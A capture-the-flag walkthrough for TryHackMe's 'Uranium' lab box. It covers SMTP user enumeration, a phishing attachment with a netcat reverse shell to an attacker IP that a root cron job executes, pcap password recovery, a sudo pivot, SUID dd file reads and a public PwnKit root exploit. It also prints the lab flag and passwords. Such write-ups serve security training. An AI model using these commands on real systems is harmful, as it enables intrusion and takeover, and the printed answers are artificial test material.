---
title: "Uranium CTF"
type: docs
tags:
  - thm
  - linux
  - hard
  - smtp
  - phishing
  - pcap
  - gtfobins
  - pwnkit
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Hard, **IP:** 10.10.219.112

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **SMTP** user enumeration → valid recipients (`web`, `hakanbey`, …).
2. A hint (Twitter) points to an automated mail handler: a root cron runs `ripmime` on `hakanbey`'s inbox and **executes any attachment named `application*`**. Mail an `application` file containing a reverse shell → shell as `web`.
3. A `.pcap` on disk (found via linpeas) contains the password for `./chat_with_kral4`; run the chat and it hands over **`hakanbey`**'s password (`Mys3cr3tp4sw0rD`).
4. `hakanbey` may `sudo -u kral4 /bin/bash` → **kral4**, who has SUID **`/bin/dd`** → [GTFOBins dd](https://gtfobins.github.io/gtfobins/dd/#suid) to read the web flag.
5. **PwnKit (CVE-2021-4034)** → root.

</div>

## Reconnaissance, SMTP user enum

I kicked things off with SMTP user enumeration, since port 25 was open and `VRFY`-style probing against an SMTP daemon is often a quick way to build a list of valid usernames worth targeting later:

```console
$ smtp-user-enum -M VRFY -U users.txt -t 10.10.219.112
[+] 10.10.219.112:25   Users found: _apt, backup, bin, daemon, ... web, www-data
```

## Foothold, phishing the mail handler

Poking around for a way to weaponise one of the usernames I had just found, a hint pointed me toward an automated mail handler running on the box. Reading the cron entry confirmed it: root parses `hakanbey`'s inbox on a schedule and does something dangerous with any attachment it finds inside.

```bash
* * * * * ripmime -i /var/mail/hakanbey -d /home/hakanbey/mail_file/ ; \
  find /home/hakanbey/mail_file/ -name "application*" -type f -exec chmod +x {} \; -exec {} \; ; \
  > /var/mail/hakanbey ; rm /home/hakanbey/mail_file/*
```

The cron job executes any file inside the extracted mail whose name starts with `application`, and it runs as root since the cron itself belongs to root. My plan was simple from there: craft an attachment literally named `application` containing a reverse shell payload, and let the mail handler execute it for me.

```bash
# application
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.59.97 9001 >/tmp/f
```

With the payload written, I emailed it to `hakanbey` directly, using `sendemail` so I could control every header and attach the file exactly as I needed:

```bash
sendemail -f baphomet@abadd0n.xyz -t hakanbey@uranium.thm -s 10.10.219.112 \
  -a application -u "my application" -m "here is my application" -o tls=no
```

Sure enough, once the cron job fired and processed the new mail, my reverse shell caught a connection back as **web**.

## web → hakanbey (pcap + chat binary)

With a foothold as web, I ran linpeas again to look for anything left lying around, and it flagged a `.pcap` file sitting on disk. Opening it in Wireshark and following the streams turned up a password for a binary called `chat_with_kral4`:

![Pasted image 20240412194641](Pasted-image-20240412194641.png)

```console
$ ./chat_with_kral4
PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
...
kral4: okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
```

## hakanbey → kral4 → flag (SUID dd)

Using that recovered password to switch over to hakanbey, I checked what sudo rights the account had been granted:

```console
$ sudo -l
User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash

$ sudo -u kral4 /bin/bash -p
kral4@uranium:~$
```

Once I had a shell as `kral4`, a quick look at the filesystem turned up something immediately exploitable: `/bin/dd` was SUID and set up so `kral4` could invoke it directly, a textbook [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#suid) case for reading files with elevated privileges.

```console
$ ls -l /bin/dd
-rwsr-x--- 1 web kral4 75K Apr 23  2021 /bin/dd

$ dd if=/var/www/html/web_flag.txt
thm{019d332a6a223a98b955c160b3e6750a}
```

## Root, PwnKit

For the final step, the kernel and polkit versions on this box lined up with **PwnKit**, **CVE-2021-4034**, a local privilege escalation bug in `pkexec` that had clearly been left unpatched here, so I grabbed a public PwnKit exploit and ran it directly for a root shell:

```bash
chmod +x PwnKit && ./PwnKit      # root@uranium
```
